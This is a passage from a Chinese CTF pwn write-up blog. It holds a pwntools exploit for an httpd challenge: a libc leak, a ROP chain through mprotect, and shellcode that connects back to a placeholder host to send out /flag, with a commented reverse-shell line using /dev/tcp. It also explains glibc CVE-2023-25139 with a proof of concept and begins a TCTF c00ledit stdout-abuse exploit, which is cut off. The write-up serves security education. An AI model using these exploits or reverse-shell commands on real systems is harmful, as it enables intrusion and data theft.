class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;122.9.149.82&#x27;, 9999)</span></span><br><span class="line">p = process(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /init\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    rand = process(<span class="string">&#x27;get_rand&#x27;</span>)</span><br><span class="line">    value = rand.recv(<span class="number">13</span>)</span><br><span class="line">    rand.close()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setlocal</span>(<span class="params">data, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /setlocale?&#x27;</span> + data + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">name, pawd, uid, size, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /register?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;&amp;uid=&#x27;</span> + <span class="built_in">str</span>(uid) + <span class="string">&#x27;&amp;len=&#x27;</span> + <span class="built_in">str</span>(size) + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">data</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /test&#x27;</span> + data + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logoff</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /logoff?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /show?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, pawd, size, data, fd</span>):</span><br><span class="line">    pl = <span class="string">b&#x27;POST /note?&#x27;</span> + <span class="string">b&#x27;username=&#x27;</span> + name + <span class="string">b&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">b&#x27;\nContent-Length: &#x27;</span> + <span class="built_in">str</span>(size).encode() + <span class="string">b&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd).encode() + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    pl = <span class="string">&#x27;GET /poweroff\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">3</span>)<span class="comment">#放入unsorted以此泄露</span></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">show(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">1</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1f6ce0</span></span><br><span class="line"></span><br><span class="line">reg(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">setlocal(<span class="string">&#x27;=&#x27;</span> + <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line">reg(<span class="string">&#x27;a:b:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x10</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c:c:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x400</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system, binsh = get_sb()</span><br><span class="line">_IO_wfile_jumps = libc_base + <span class="number">0x1f3240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line"></span><br><span class="line">pl = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(environ) <span class="comment">#+ p64(0x400)</span></span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x1a32)&#x27;)</span></span><br><span class="line"></span><br><span class="line">show(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">stack = l64()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack - <span class="number">0xca0</span>) + p64(<span class="number">0x400</span>)</span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">rdi = libc_base + <span class="number">0x240e5</span></span><br><span class="line">rsi = libc_base + <span class="number">0x2573e</span></span><br><span class="line">rdx = libc_base + <span class="number">0x26302</span></span><br><span class="line">rax = libc_base + <span class="number">0x40123</span></span><br><span class="line">ret = libc_base + <span class="number">0x23159</span></span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#pl = p64(ret) + p64(rdi) + p64(stack - 0xca0 + 0x20) + p64(system)</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh -i &gt;&amp; /dev/tcp/x/x 0&gt;&amp;1\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = p64(rdi) + p64((stack &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span>) + p64(rsi) + p64(<span class="number">0x10000</span>) + p64(rdx) + p64(<span class="number">0x7</span>)</span><br><span class="line">pl += p64(mprotect) + p64(stack - <span class="number">0xca0</span> + <span class="number">0x40</span>)</span><br><span class="line">pl += asm(shellcraft.connect(<span class="string">&#x27;xx.xx.xx.xx.xx&#x27;</span>, xx) + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="number">2</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>, stdout)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="CVE-2023-25139"><a href="#CVE-2023-25139" class="headerlink" title="CVE-2023-25139"></a>CVE-2023-25139</h2><p>原文链接:</p><p><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=30068">30068 – (CVE-2023-25139) incorrect printf output for integers with thousands separator and width field (CVE-2023-25139) (sourceware.org)</a></p><p>这个cve原理很简单</p><p>在glibc2.37的某些版本,例如Ubuntu GLIBC 2.37-0ubuntu1(<u>Ubuntu GLIBC 2.37-0ubuntu2就修复了</u>)</p><p>当调用<a href="`setlocale` 函数安装指定的系统本地环境或其一部分，作为新的 C 本地环境。修改保持效果，并影响所有关乎本地环境的 C 库函数执行，到下次调用 `setlocale` 为止。若 `locale` 为空指针，则 `setlocale` 查询当前 C 本地环境而不修改它。">setlocale函数</a></p><p>如果设置LC_NUMERIC或LC_ALL为一个含有千位分割符的地区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_CTYPE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NUMERIC 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TIME 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_COLLATE 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MONETARY 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MESSAGES 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ALL 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_PAPER 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NAME 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ADDRESS 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TELEPHONE10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MEASUREMENT11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_IDENTIFICATION12</span></span><br></pre></td></tr></table></figure><p>例如”en_US.UTF-8”</p><p>然后在使用格式化字符串时,如果有<strong>“%-‘nd”</strong>,即使用数字分隔符左对齐n个字符位格式化一个整型</p><p>那么整型有几个千位分隔符,格式化的结果就会多出几位</p><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>];</span><br><span class="line">  __builtin_memset (buf, <span class="string">&#x27;x&#x27;</span>, <span class="keyword">sizeof</span> (buf));</span><br><span class="line">  <span class="keyword">if</span> (setlocale (<span class="number">6</span>, <span class="string">&quot;en_US.UTF-8&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;1234567890123:\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;%-&#x27;13ld:\n&quot;</span>, <span class="number">1234567999L</span>);</span><br><span class="line">      <span class="built_in">sprintf</span> (buf, <span class="string">&quot;%0+ -&#x27;13ld:&quot;</span>, <span class="number">1234567L</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;%c&quot;</span>, buf[i]);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output,两个千位分隔符所以多出两个字符位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1234567890123:</span><br><span class="line">+1,234,567     :</span><br><span class="line">+1,234,567     </span><br></pre></td></tr></table></figure><p>因此如果sprintf使用这个格式化字符串,就有可能会造成缓冲区溢出</p><p>特别是缓冲区大小刚好的时候,因为sprintf会在拼接的格式化字符串后面置’\0’</p><h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>当随机数函数的种子是由rand(time(0))生成的</p><p>time(0)精确到秒,是可以被预测</p><p>所以只要在本地同一时间运行一个相同的获得随机数代码</p><p>那么我们就可以预测到生成的随机数</p><h1 id="2023tctf-c00ledit"><a href="#2023tctf-c00ledit" class="headerlink" title="2023tctf-c00ledit"></a>2023tctf-c00ledit</h1><p><strong>标签:stdout泄露libc|有符号溢出|ROP</strong></p><p><strong>题目介绍:</strong>Try the “edit” feature.</p><p>程序只提供了两个功能</p><p><strong>add</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1354</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r12d</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v4 = num_dword_40E4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)num_dword_40E4 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enough!&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  ptr_qword_4060[v4] = v6;</span><br><span class="line">  *v6 = <span class="number">4096LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Current node: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">  ++num_dword_40E4;</span><br><span class="line">  <span class="keyword">return</span> a4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次add item,会分配一个0x10chunk,用于记载大小和指针</p><p><strong>edit</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 idx; <span class="comment">// rbp</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="string">&quot;No chance!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( edittime_dword_40E0 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v0 = <span class="string">&quot;Invalid index!&quot;</span>;</span><br><span class="line">  idx = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( !ptr_qword_4060[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  offset = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( offset + <span class="number">7</span> &gt;= *(_QWORD *)ptr_qword_4060[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Invalid offset!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, (<span class="type">void</span> *)(*(_QWORD *)(ptr_qword_4060[idx] + <span class="number">8LL</span>) + offset), <span class="number">8uLL</span>);<span class="comment">// vuln</span></span><br><span class="line">  ++edittime_dword_40E0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit时,能够自己指定edit的item和修改的偏移起始</p><p>程序没有输出item内容的功能</p><p>存在的漏洞点是,edit读入的下标索引的类型是有符号数,转化数字使用的是atol,也就是说没有对负数进行检测</p><p>因此如果item下标索引输入负数,就能够通过bss段上的stdout等指针修改对应的FILE结构体</p><p>又因为程序存在进入io链的输出函数,所以我们自然能够想到利用stdout泄露libc</p><p>通过IO_FILE的知识可以知道,当满足一些条件时能够输出__IO_write_base至__IO_write_ptr之间的内容</p><p>因此可以修改__IO_write_ptr指针</p><p>不过我们需要先对stdout的flag进行一些修改</p><p>它的flag&amp;_IO_CURRENTLY_PUTTING标志位应该为1,IO_NO_WRITES为0,其他另行判断</p><p>确保IO_OVERFLOW不会修改我们写入的IO_write_ptr</p><p>以此泄露出libc</p><p>再之后,官方题解是利用_IO_obstack_jumps这个vtable表</p><p>还有一些选手是利用修改libc.so的got.plt</p><p>不过我选择的是再次利用stdout泄露environ,打rop</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(cintent)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span 